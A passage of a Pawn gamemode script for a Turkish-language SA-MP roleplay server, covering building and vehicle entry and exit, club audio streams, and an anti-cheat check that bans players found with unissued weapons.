                LoadObjectsForPlayer(playerid);
				return 1;
		        }
		    }
	    }
        for(new i = 0; i < sizeof(HouseInfo); i++) {
            if(IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hExteriorX], HouseInfo[i][hExteriorY], HouseInfo[i][hExteriorZ])) {
                if(HouseKey[playerid] == i || PlayerInfo[playerid][pHouse] == i || PlayerInfo[playerid][pHouse2] == i || HouseInfo[i][hLock] == 0 || PlayerInfo[playerid][pRenting] == i || strcmp(HouseInfo[i][hOwner], PlayerInfo[playerid][pMarriedTo],true) == 0) {
                    if(PlayerInfo[playerid][pHouse] == i || PlayerInfo[playerid][pHouse2] == i) {
                        format(string, sizeof(string), "* %s adlý kiþi kendi evine girdi.", GetPlayerNameEx(playerid));
                        ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                    }
                    else {
                        if(HouseInfo[i][hOwned] == 0) {
							format(string, sizeof(string), "* %s adlý kiþi eve girdi.", GetPlayerNameEx(playerid));
							ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						} else {
							format(string, sizeof(string), "* %s, %s adlý kiþinin evine girdi.", GetPlayerNameEx(playerid), HouseInfo[i][hOwner]);
							ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						}
                    }

                    SetPlayerInterior(playerid,HouseInfo[i][hHInteriorWorld]);
                    PlayerInfo[playerid][pInt] = HouseInfo[i][hHInteriorWorld];
                    PlayerInfo[playerid][pVW] = i+60000;
                    SetPlayerVirtualWorld(playerid, i+60000);
                    if(HouseInfo[i][hCustomInterior] == 1) {
                        LoadObjectsForPlayer(playerid);
                    }
                    SetPlayerPos(playerid,HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
                    SetPlayerFacingAngle(playerid,HouseInfo[i][hInteriorR]);
                    SetCameraBehindPlayer(playerid);
                    if(PlayerInfo[playerid][pHouse] == i || PlayerInfo[playerid][pHouse2] == i) {
                        GameTextForPlayer(playerid, "~w~Eve Hosgeldin", 5000, 1);
                    }
					foreach(Player, x)
					{
                		if(IsABoomboxNearby(HouseInfo[i][hInteriorX], HouseInfo[i][hInteriorY], HouseInfo[i][hInteriorZ], x) < 150.0 && i+60000 == BoomboxInfo[x][bbVW] && HouseInfo[i][hHInteriorWorld] == BoomboxInfo[x][bbInt])
						{
							PlayAudioStreamForPlayer(playerid, VehicleRadioListing[BoomboxInfo[x][bbStation]-1][radiourl], BoomboxInfo[x][bbPosX], BoomboxInfo[x][bbPosY], BoomboxInfo[x][bbPosZ], 50.0, 1);
						}
					}
                    Streamer_UpdateEx(playerid, HouseInfo[i][hInteriorX],HouseInfo[i][hInteriorY],HouseInfo[i][hInteriorZ]);
                }
                else {
                    GameTextForPlayer(playerid, "~r~Kitlendi", 5000, 1);
                }
                return 1;
            }
        }
		
        if(IsPlayerInRangeOfPoint(playerid, 2, -27.3025,-57.6649,1003.5469) || IsPlayerInRangeOfPoint(playerid, 2, 207.0638,-139.9965,1003.5078) || IsPlayerInRangeOfPoint(playerid, 2, 285.8044,-85.9956,1001.5229) || IsPlayerInRangeOfPoint(playerid, 2, 493.4252,-24.3061,1000.6797) || IsPlayerInRangeOfPoint(playerid, 2, 384.808624,173.804992,1008.382812) || IsPlayerInRangeOfPoint(playerid, 2, 372.3830,-133.2579,1001.4922) // 24/7 || Clothes Shop || Ammunation || Club || Advertisement Agency || FastFood
    || IsPlayerInRangeOfPoint(playerid, 2, 1003.9112,52.2134,55.3221))
	{
	    new idx;
		idx = GetPlayerVirtualWorld(playerid)-100;
		/*if(!done && idx < MAX_BIZ && BizInfo[idx][bType])
		{*/
			format(string, sizeof(string), "* %s kapýyý açar ve dükkandan ayrýlýr.", RPN(playerid));
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	        SetPlayerPos(playerid, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]);
	        SetPlayerInterior(playerid, 0);
	        SetPlayerVirtualWorld(playerid, 0);
        /*}*/
//        done = 1;
    }
	
		// Hitman HQ
        if(IsPlayerInRangeOfPoint(playerid, 2.0,  1938.545898, 165.629531, 37.281250)) {
            if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4) {
                SetPlayerVirtualWorld(playerid, 666420);
                PlayerInfo[playerid][pVW] = 666420;
                SetPlayerInterior(playerid, 42);
                PlayerInfo[playerid][pInt] = 42;
                SetPlayerPos(playerid, 1277.019165, -758.428771, 5080.750000);
                SetPlayerFacingAngle(playerid, 358.16);
                SetCameraBehindPlayer(playerid);

                LoadObjectsForPlayer(playerid);
                SendClientMessage(playerid, COLOR_WHITE, "Mühimmat odasýnda /siparis yazarak silah alabilirsin.");
                return 1;
            }
        }

		// The Lubu Gentlemen's Club
        else if(IsPlayerInRangeOfPoint(playerid, 3.0,  511.817230, -1510.971679, 14.566996)) {
            format(string, sizeof(string), "* %s Lubu Beyler Kulübüne girdi.", GetPlayerNameEx(playerid));
            ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerVirtualWorld(playerid, 373737);
            PlayerInfo[playerid][pVW] = 373737;
            SetPlayerInterior(playerid, 37);
            PlayerInfo[playerid][pInt] = 37;
            SetPlayerPos(playerid, -1077.946533, 613.206665, 1116.507812);
            SetPlayerFacingAngle(playerid, 92.42);
            SetCameraBehindPlayer(playerid);

            LoadObjectsForPlayer(playerid);

            PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=242774", -1087.677978, 615.239807, 1116.507812, 40.0, 1);
            return 1;
        }

		// The Tableau Club
        else if(IsPlayerInRangeOfPoint(playerid, 3.0,  561.802795, -1506.722412, 14.548986)) {
            format(string, sizeof(string), "* %s Scylla Kulübüne girdi.", GetPlayerNameEx(playerid));
            ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerVirtualWorld(playerid, 363636);
            PlayerInfo[playerid][pVW] = 363636;
            SetPlayerInterior(playerid, 36);
            PlayerInfo[playerid][pInt] = 36;
            SetPlayerPos(playerid, 308.045654, 1053.886840, 1098.540039);
            SetPlayerFacingAngle(playerid, 267.57);
            SetCameraBehindPlayer(playerid);

            LoadObjectsForPlayer(playerid);

            PlayAudioStreamForPlayer(playerid, "http://188.132.234.206:8000/listen.pls", 321.139465, 1034.947753, 1098.914062, 120.0, 1);
            return 1;
        }

		// The Tableau Club (VIP ROOM)
        else if(IsPlayerInRangeOfPoint(playerid, 3.0,  307.904296, 1025.602294, 1098.540039)) {
            if(GetPlayerCash(playerid) >= 100) {
                format(string, sizeof(string), "* %s Scylla VIP odasýna girdi.", GetPlayerNameEx(playerid));
                ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

                GivePlayerCash(playerid, -100);
                GameTextForPlayer(playerid, "~r~-$100", 3000, 1);

                SetPlayerVirtualWorld(playerid, 363636);
                PlayerInfo[playerid][pVW] = 363636;
                SetPlayerInterior(playerid, 36);
                PlayerInfo[playerid][pInt] = 36;
                SetPlayerPos(playerid, 293.066436, 1029.785278, 1104.560058);
                SetPlayerFacingAngle(playerid, 352.47);
                SetCameraBehindPlayer(playerid);
                return 1;
            }
            else return SendClientMessage(playerid, COLOR_GREY, "Bunun için paran yok.");
        }

		// Santa Maria Surfer's Lounge
        else if(IsPlayerInRangeOfPoint(playerid, 3.0,  387.958374, -1870.688110, 7.835937)) {
            format(string, sizeof(string), "* %s Santa Maria Kumsalýndaki sörfçü salonuna girdi.", GetPlayerNameEx(playerid));
            ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerVirtualWorld(playerid, 353535);
            PlayerInfo[playerid][pVW] = 353535;
            SetPlayerInterior(playerid, 35);
            PlayerInfo[playerid][pInt] = 35;
            SetPlayerPos(playerid, 271.742034, 1074.419677, 5096.750000);
            SetPlayerFacingAngle(playerid, 86.54);
            SetCameraBehindPlayer(playerid);

            LoadObjectsForPlayer(playerid);

            PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=21585", 271.742034, 1074.419677, 5096.750000, 120.0, 1);
            return 1;
        }

        new vehicleid = GetPlayerVehicleID(playerid);
        new closestcar = GetClosestCar(playerid, vehicleid);
        if(IsPlayerInRangeOfVehicle(playerid, closestcar, 6.0) && GetVehicleModel(closestcar) == 519) {
            if(VehicleStatus{closestcar}
            == 1) return SendClientMessage(playerid, COLOR_WHITE, "Shamal model uçaða binme iznin yok çünki çok hasarlý!");
            format(string, sizeof(string), "* %s adlý kiþi Shamal model uçaða yolcu olarak bindi.", GetPlayerNameEx(playerid));
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            SetPlayerPos(playerid, 2.509036, 23.118730, 1199.593750);
            SetPlayerFacingAngle(playerid, 82.14);
            SetCameraBehindPlayer(playerid);
            PlayerInfo[playerid][pVW] = closestcar;
            SetPlayerVirtualWorld(playerid, closestcar);
            PlayerInfo[playerid][pInt] = 1;
            SetPlayerInterior(playerid, 1);
            InsideShamal[playerid] = closestcar;
            SendClientMessage(playerid, COLOR_WHITE, "Uçaðýn kapýsýndan dýþarý çýkmak için /cik yaz. /camdanbak komutu ile dýþarý bakabilirsin.");

      		foreach(Player, x)
			{
 				if(IsABoomboxNearby(2.509036, 23.118730, 1199.593750, x) < 150.0 && closestcar == BoomboxInfo[x][bbVW] && BoomboxInfo[x][bbInt] == 1)
				{
					PlayAudioStreamForPlayer(playerid, VehicleRadioListing[BoomboxInfo[x][bbStation]-1][radiourl], BoomboxInfo[x][bbPosX], BoomboxInfo[x][bbPosY], BoomboxInfo[x][bbPosZ], 50.0, 1);
				}
			}
            return 1;
        }

        for(new i = 0; i <  sizeof(DDoorsInfo); i++) {
            if(IsPlayerInRangeOfPoint(playerid,3,DDoorsInfo[i][ddInteriorX], DDoorsInfo[i][ddInteriorY], DDoorsInfo[i][ddInteriorZ]) && PlayerInfo[playerid][pVW] == DDoorsInfo[i][ddInteriorVW]) {
                format(string, sizeof(string), "* %s binadan dýþarý çýktý.", GetPlayerNameEx(playerid));
                ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

                SetPlayerInterior(playerid,DDoorsInfo[i][ddExteriorInt]);
                PlayerInfo[playerid][pInt] = DDoorsInfo[i][ddExteriorInt];
                SetPlayerVirtualWorld(playerid, DDoorsInfo[i][ddExteriorVW]);
                PlayerInfo[playerid][pVW] = DDoorsInfo[i][ddExteriorVW];
                if(DDoorsInfo[i][ddCustomExterior]) {
                    LoadObjectsForPlayer(playerid);
                }
                if(DDoorsInfo[i][ddVehicleAble] > 0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) {
                    SetVehiclePos(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorX],DDoorsInfo[i][ddExteriorY],DDoorsInfo[i][ddExteriorZ]);
                    SetVehicleZAngle(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorA]);
                    SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorVW]);
                    LinkVehicleToInterior(GetPlayerVehicleID(playerid), DDoorsInfo[i][ddExteriorInt]);
                }
                else {
                    SetPlayerPos(playerid,DDoorsInfo[i][ddExteriorX],DDoorsInfo[i][ddExteriorY],DDoorsInfo[i][ddExteriorZ]);
                    SetPlayerFacingAngle(playerid, DDoorsInfo[i][ddExteriorA]);
                    SetCameraBehindPlayer(playerid);
                }
                return Streamer_UpdateEx(playerid, DDoorsInfo[i][ddInteriorX],DDoorsInfo[i][ddInteriorY],DDoorsInfo[i][ddInteriorZ]);
            }
        }
        for(new i = 0; i <  sizeof(HouseInfo); i++) {
            if(IsPlayerInRangeOfPoint(playerid,3,HouseInfo[i][hInteriorX], HouseInfo[i][hInteriorY], HouseInfo[i][hInteriorZ]) && (GetPlayerVirtualWorld(playerid) == i+60000)) {
                format(string, sizeof(string), "* %s evden dýþarý çýktý.", GetPlayerNameEx(playerid));
                ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                SetPlayerInterior(playerid,0);
                PlayerInfo[playerid][pInt] = 0;
                if(HouseInfo[i][hCustomExterior]) {
					LoadObjectsForPlayer(playerid);
                }
                SetPlayerPos(playerid,HouseInfo[i][hExteriorX],HouseInfo[i][hExteriorY],HouseInfo[i][hExteriorZ]);
                SetPlayerFacingAngle(playerid, HouseInfo[i][hExteriorR]);
                SetCameraBehindPlayer(playerid);
                SetPlayerVirtualWorld(playerid, 0);
                PlayerInfo[playerid][pVW] = 0;
                return Streamer_UpdateEx(playerid, HouseInfo[i][hExteriorX],HouseInfo[i][hExteriorY],HouseInfo[i][hExteriorZ]);
            }
        }

		// Hitman HQ
        if(IsPlayerInRangeOfPoint(playerid, 2.0, 1277.019165, -758.428771, 5080.750000) && (GetPlayerVirtualWorld(playerid) == 666420)) {
            if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4) {
                SetPlayerVirtualWorld(playerid, 0);
                PlayerInfo[playerid][pVW] = 0;
                SetPlayerInterior(playerid, 0);
                PlayerInfo[playerid][pInt] = 0;
                SetPlayerPos(playerid, 1938.545898, 165.629531, 37.281250);
                SetPlayerFacingAngle(playerid, 338.54);
                SetCameraBehindPlayer(playerid);
                return 1;
            }
        }

		// The Lubu Gentlemen's Club
        else if(IsPlayerInRangeOfPoint(playerid, 3.0, -1077.946533, 613.206665, 1116.507812) && (GetPlayerVirtualWorld(playerid) == 373737)) {
            format(string, sizeof(string), "* %s binadan dýþarý çýktý.", GetPlayerNameEx(playerid));
            ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerVirtualWorld(playerid, 0);
            PlayerInfo[playerid][pVW] = 0;
            SetPlayerInterior(playerid, 0);
            PlayerInfo[playerid][pInt] = 0;
            SetPlayerPos(playerid, 511.817230, -1510.971679, 14.566996);
            SetPlayerFacingAngle(playerid, 272.11);
            SetCameraBehindPlayer(playerid);

            StopAudioStreamForPlayer(playerid);
            return 1;
        }

		// The Tableau Club
        else if(IsPlayerInRangeOfPoint(playerid, 3.0, 308.045654, 1053.886840, 1098.540039) && (GetPlayerVirtualWorld(playerid) == 363636)) {
            format(string, sizeof(string), "* %s binadan dýþarý çýktý.", GetPlayerNameEx(playerid));
            ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerVirtualWorld(playerid, 0);
            PlayerInfo[playerid][pVW] = 0;
            SetPlayerInterior(playerid, 0);
            PlayerInfo[playerid][pInt] = 0;
            SetPlayerPos(playerid, 561.802795, -1506.722412, 14.548986);
            SetPlayerFacingAngle(playerid, 86.78);
            SetCameraBehindPlayer(playerid);

            StopAudioStreamForPlayer(playerid);
            return 1;
        }
		// The Tableau Club (VIP ROOM)
        else if(IsPlayerInRangeOfPoint(playerid, 3.0, 293.066436, 1029.785278, 1104.560058) && (GetPlayerVirtualWorld(playerid) == 363636)) {
            SetPlayerVirtualWorld(playerid, 363636);
            PlayerInfo[playerid][pVW] = 363636;
            SetPlayerInterior(playerid, 36);
            PlayerInfo[playerid][pInt] = 36;
            SetPlayerPos(playerid, 307.904296, 1025.602294, 1098.540039);
            SetPlayerFacingAngle(playerid, 264.06);
            SetCameraBehindPlayer(playerid);
            return 1;
        }
		// Santa Maria Surfer's Lounge
        else if(IsPlayerInRangeOfPoint(playerid, 3.0, 271.742034, 1074.419677, 5096.750000) && (GetPlayerVirtualWorld(playerid) == 353535)) {
            format(string, sizeof(string), "* %s binadan dýþarý çýktý.", GetPlayerNameEx(playerid));
            ProxDetector(25.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            SetPlayerVirtualWorld(playerid, 0);
            PlayerInfo[playerid][pVW] = 0;
            SetPlayerInterior(playerid, 0);
            PlayerInfo[playerid][pInt] = 0;
            SetPlayerPos(playerid, 387.958374, -1870.688110, 7.835937);
            SetPlayerFacingAngle(playerid, 89.99);
            SetCameraBehindPlayer(playerid);

            StopAudioStreamForPlayer(playerid);
            return 1;
        }
		// Shamal
        else if(InsideShamal[playerid] != INVALID_VEHICLE_ID && IsPlayerInRangeOfPoint(playerid,3,2.509036, 23.118730, 1199.593750)) {
            format(string, sizeof(string), "* %s adlý kiþi Shamal model uçaktan dýþarý çýktý.", GetPlayerNameEx(playerid));
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

            if(InsideShamal[playerid] == INVALID_VEHICLE_ID || GetVehicleModel(InsideShamal[playerid]) != 519) {
                PlayerInfo[playerid][pAGuns][GetWeaponSlot(46)] = 46;
                GivePlayerValidWeapon(playerid, 46, 60000);
                SetPlayerPos(playerid, 0.000000, 0.000000, 420.000000);
            }
            else {
                new Float:X, Float:Y, Float:Z;
                GetVehiclePos(InsideShamal[playerid], X, Y, Z);
                SetPlayerPos(playerid, X-4, Y-2.3, Z);

                new Float:XB, Float:YB, Float:ZB;
                GetVehiclePos(InsideShamal[playerid], XB, YB, ZB);
                if(ZB > 50.0) {
                    PlayerInfo[playerid][pAGuns][GetWeaponSlot(46)] = 46;
                    GivePlayerValidWeapon(playerid, 46, 60000);
                }
            }

            PlayerInfo[playerid][pVW] = 0;
            SetPlayerVirtualWorld(playerid, 0);
            PlayerInfo[playerid][pInt] = 0;
            SetPlayerInterior(playerid, 0);
            InsideShamal[playerid] = INVALID_VEHICLE_ID;
        }
    }
	return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
	return 1;
}

OnPlayerChangeWeapon(playerid, newweapon)
{
    if(pTazer[playerid] == 1) SetPlayerArmedWeapon(playerid,23);

	if(PlayerInfo[playerid][pAdmin] < 5)
	{
		if(GetPVarInt(playerid, "EventToken") != 0) return 1;

		if(PlayerInfo[playerid][pGuns][1] != 2 && PlayerInfo[playerid][pAGuns][1] != 2 && GetPlayerWeapon(playerid) == 2)
		{
			//ExecuteHackerAction(playerid, newweapon);
		}
		else if(PlayerInfo[playerid][pGuns][1] != 3 && PlayerInfo[playerid][pAGuns][1] != 3 && GetPlayerWeapon(playerid) == 3)
		{
			ExecuteHackerAction(playerid, newweapon);
		}
		else if(PlayerInfo[playerid][pGuns][1] != 4 && PlayerInfo[playerid][pAGuns][1] != 4 && GetPlayerWeapon(playerid) == 4)
		{
  			new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
   			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
   			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
		}
		else if(PlayerInfo[playerid][pGuns][1] != 5 && PlayerInfo[playerid][pAGuns][1] != 5 && GetPlayerWeapon(playerid) == 5)
		{
			ExecuteHackerAction(playerid, newweapon);
		}
        else if(PlayerInfo[playerid][pGuns][1] != 6 && PlayerInfo[playerid][pAGuns][1] != 6 && GetPlayerWeapon(playerid) == 6)
		{
			ExecuteHackerAction(playerid, newweapon);
		}
		else if(PlayerInfo[playerid][pGuns][1] != 7 && PlayerInfo[playerid][pAGuns][1] != 7 && GetPlayerWeapon(playerid) == 7)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][1] != 8 && PlayerInfo[playerid][pAGuns][1] != 8 && GetPlayerWeapon(playerid) == 8)
        {
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][1] != 9 && PlayerInfo[playerid][pAGuns][1] != 9 && GetPlayerWeapon(playerid) == 9)
        {
  			new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
   			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
        }
        else if(PlayerInfo[playerid][pGuns][2] != 22 && PlayerInfo[playerid][pAGuns][2] != 22 && GetPlayerWeapon(playerid) == 22)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
		    {
			    new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
	            format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][2] != 23 && PlayerInfo[playerid][pAGuns][2] != 23 && GetPlayerWeapon(playerid) == 23)
        {
       		if(PlayerInfo[playerid][pConnectTime] < 2)
			{
   				new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
  			ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][2] != 24 && PlayerInfo[playerid][pAGuns][2] != 24 && GetPlayerWeapon(playerid) == 24)
        {
        	if(PlayerInfo[playerid][pConnectTime] < 2)
	    	{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s) (%d-%d-%d)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
  			ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][3] != 25 && PlayerInfo[playerid][pAGuns][3] != 25 && GetPlayerWeapon(playerid) == 25)
        {
       		if(PlayerInfo[playerid][pConnectTime] < 2)
	    	{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
  			ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][3] != 26 && PlayerInfo[playerid][pAGuns][3] != 26 && GetPlayerWeapon(playerid) == 26)
        {
    		new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
			//RemovePlayerWeapon(playerid, weaponid);
			PlayerInfo[playerid][pBanned] = 3;
			new playerip[32];
			GetPlayerIp(playerid, playerip, sizeof(playerip));
			format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
			PlayerInfo[playerid][pBanned] = 3;
			Log("logs/ban.log", String);
			new ip[32];
			GetPlayerIp(playerid,ip,sizeof(ip));
			AddBan(ip);
			Kick(playerid);
			TotalAutoBan++;
        }
        else if(PlayerInfo[playerid][pGuns][3] != 27 && PlayerInfo[playerid][pAGuns][3] != 27 && GetPlayerWeapon(playerid) == 27)
        {
            if(PlayerInfo[playerid][pConnectTime] < 2)
    		{
		    	new WeaponName[32];
				GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
				new String[128];
    			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
				SendClientMessageToAllEx(COLOR_LIGHTRED, String);
				SetPVarInt(playerid, "_HACK_WARNINGS", 0);
				//RemovePlayerWeapon(playerid, weaponid);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(String, sizeof(String), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Silah Hilesi (%s)", GetPlayerNameEx(playerid), playerip, WeaponName);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", String);
				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
            ExecuteHackerAction(playerid, newweapon);
        }
        else if(PlayerInfo[playerid][pGuns][4] != 28 && PlayerInfo[playerid][pAGuns][4] != 28 && GetPlayerWeapon(playerid) == 28)
        {
  			new WeaponName[32];
			GetWeaponName(newweapon, WeaponName, sizeof(WeaponName));
			new String[128];
			format(String, sizeof(String), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Silah Hilesi (%s).", GetPlayerNameEx(playerid), WeaponName);
			SendClientMessageToAllEx(COLOR_LIGHTRED, String);
			SetPVarInt(playerid, "_HACK_WARNINGS", 0);
